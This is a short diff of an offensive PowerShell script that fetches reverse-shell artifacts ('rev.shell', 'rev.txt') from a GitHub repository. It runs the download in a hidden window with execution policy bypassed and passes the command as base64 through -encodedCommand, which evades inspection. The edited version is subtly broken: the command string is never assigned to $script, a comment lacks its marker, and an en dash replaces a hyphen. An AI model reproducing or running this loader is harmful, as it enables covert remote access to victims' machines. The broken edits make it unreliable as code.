@@ -1,17 +1,12 @@
-##Declare .txt file / in memory variable
-$script="powershell -ExecutionPolicy Bypass -WindowStyle Hidden -command {(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/marq36/rev.shell/master/rev.shell', '.\Rev.Shell')}"
-##encode/encrypt .txt file / in memory variable
+##Declare artifact download script as an in memory variable
+"powershell –ExecutionPolicy Bypass -WindowStyle Hidden -command {(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/marq36/rev.shell/master/rev.txt', '.\REV.txt') }; powershell -command {(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/marq36/rev.shell/master/rev.shell', '.\Rev.Shell')}"
+##transfer $script to unicode value called $bytes in memory
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
-$encScript = [Convert]::ToBase64String($bytes)
-##Execute GET .txt file
-powershell.exe -encodedCommand $encScript
 
-#Declare .shell file / in memory variable
-$script="powershell -ExecutionPolicy Bypass -WindowStyle Hidden -command {(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/marq36/rev.shell/master/rev.shell', '.\Rev.Shell')}"
-##encode/encrypt .txt file / in memory variable
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
+Convert $bytes to base64 encoded string
 $encScript = [Convert]::ToBase64String($bytes)
-##Execute GET .shell file
+
+##Execute encoded command to pull down artifacts rev.txt & rev.shell
 powershell.exe -encodedCommand $encScript
 
 #Declare compiler / in memory variable
